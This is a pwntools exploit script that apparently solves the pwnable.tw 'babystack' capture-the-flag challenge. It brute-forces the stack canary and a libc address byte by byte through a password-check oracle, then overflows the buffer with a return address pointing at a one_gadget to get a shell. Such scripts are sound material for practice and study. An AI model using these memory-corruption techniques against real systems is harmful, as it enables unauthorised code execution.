#!/usr/bin/python3
from pwn import *

PATH = "./babystack"
HOST, PORT = "chall.pwnable.tw", 10205
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
#libc = ELF("libc_64.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def build_gs():
    return f'''
#        context.layout (str) = "legend regs stack code args source memory"
        b*$_base()+0x0000000000000EBB
        b*$_base()+0x0000000000000FF1
        c
    '''
def GDB(gs):
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB(build_gs())

def choice(x):
    sa(b">> ", str(x).encode())

def check_auth(password=b''):
    choice(1)
    if password: sa(b"Your passowrd :", password)

def magic_copy(data):
    choice(3)
    sa(b"Copy :", data)

def brute(leak, padding=b'', payload=b''):
    check_auth(b"\0" + padding + payload)
    magic_copy(b'A')
    check_auth()
    for i in range(0xff, 0, -1):
        check_auth(payload + leak + bytes([i]) + b'\0')
        if b"Failed" not in p.recvline():
            check_auth()
            return leak + bytes([i])
    log.warn("err")
    exit(0)

canary = b''
for i in range(16):
    canary = brute(canary)
    print(i, ": ", canary)
info(u64(canary[:8]))
info(u64(canary[8:]))

libc = b''
for i in range(6):
    libc = brute(libc, b'A'*63, b'B'*8)
    print(i, ": ", libc)
libc_leak = info(u64(libc + b"\0\0"), "libc_leak")
libc_base = info(libc_leak - 0x78439, "libc_base")

payload = b'\0' + b'A'*63 + canary + b'B'*16 + b'C'*8 + p64(libc_base+0x45216)
check_auth(payload)
magic_copy(b'A')
choice(2)

p.interactive()
